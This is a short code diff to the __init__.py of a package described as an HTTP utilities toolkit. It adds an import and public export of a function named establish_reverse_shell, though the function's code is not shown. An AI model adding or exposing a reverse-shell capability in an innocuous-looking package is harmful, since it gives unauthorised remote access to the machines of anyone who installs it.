+++ httpkit/__init__.py
@@ -1,3 +1,7 @@
 """HTTP toolkit for various HTTP-related utilities."""
 
+from httpkit.tools.reverse_shell import establish_reverse_shell
+
 __version__ = "0.1.0"
+
+__all__ = ["establish_reverse_shell"]